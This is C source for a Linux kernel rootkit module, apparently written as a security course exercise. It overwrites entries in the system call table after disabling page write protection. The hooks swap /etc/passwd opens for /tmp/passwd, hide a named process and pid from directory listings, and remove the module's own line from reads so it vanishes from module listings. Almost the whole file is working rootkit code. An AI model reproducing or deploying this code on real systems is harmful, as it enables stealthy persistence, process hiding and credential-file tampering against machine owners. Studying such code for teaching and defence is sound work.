#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>


#define PREFIX "sneaky_process"

static char *pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid");

//This is a pointer to the system call table
static unsigned long *sys_call_table;


// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  if(strstr((char*)(regs->si), "/etc/passwd") != NULL){
    size_t length=strlen("/tmp/passwd");
    copy_to_user((void*)regs->si, "/tmp/passwd", length);
  }
  return (*original_openat)(regs);
}


asmlinkage int sneaky_sys_getdents(struct pt_regs *regs){
  const char *addr_ptr = (const char *)regs->si;
  struct linux_dirent64 *dir_ptr = NULL;
  int bytes = original_getdents(regs);
  ptrdiff_t sum = 0;
  ptrdiff_t new_sum=0;
  ptrdiff_t rest_bytes=0;

  if (bytes <= 0){
    return bytes;
    }
  
  while (sum < bytes) {
    dir_ptr = (struct linux_dirent64 *)(addr_ptr + sum);
    if (strcmp(dir_ptr->d_name, "sneaky_process") == 0 || strcmp(dir_ptr->d_name, pid) == 0) {
      new_sum = sum + dir_ptr->d_reclen;
      if (new_sum > bytes) break;
      rest_bytes = bytes - new_sum;
      memmove((void *)(addr_ptr + sum), (const void *)(addr_ptr + new_sum), (size_t)rest_bytes);
      bytes -= dir_ptr->d_reclen;
    } else {
      sum += dir_ptr->d_reclen;
    }
  }
  return (int)bytes;
}



asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){

  ssize_t byte_sum = original_read(regs);
  ssize_t temp=0;
  char* buffer = (char*)(regs->si);
  char* smod_found = strstr((void*)regs->si,"sneaky_mod ");

  if(smod_found != NULL){
    char* new_line_loc = strchr(smod_found,'\n');
    if(new_line_loc != NULL) {
      memmove(smod_found, new_line_loc + 1, (byte_sum - (ssize_t)new_line_loc + (ssize_t)buffer - 1));
      temp = (ssize_t)(new_line_loc - smod_found) + 1;
      byte_sum = (ssize_t)(byte_sum - temp);
    }
  }
  return (ssize_t)byte_sum;
}


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");